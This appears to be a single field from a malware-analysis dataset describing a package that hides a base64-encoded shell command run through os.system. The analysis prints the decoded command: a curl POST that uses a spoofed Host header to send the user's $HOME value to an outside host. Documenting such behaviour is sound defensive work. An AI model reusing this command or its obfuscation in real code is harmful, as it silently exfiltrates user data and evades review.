      "malicious_behavior": "The code contains a base64-encoded string that decodes to a shell command executed via os.system without any user interaction or validation. The decoded command is: curl -k -X POST \"https://pypi.org\" -H \"Host: psec.forward.io.global.prod.fastly.net\" -d \"test=$HOME\". This command silently sends an HTTP POST request to a suspicious host (psec.forward.io.global.prod.fastly.net) with the environment variable $HOME as data, without user consent or notification. The use of base64 encoding to hide the command, execution of a shell command that performs network communication to a non-standard domain, and absence of legitimate application logic or error handling are strong indicators of malicious intent. This pattern aligns with known malware behaviors involving obfuscated remote data exfiltration or command execution. Therefore, the code is malicious."
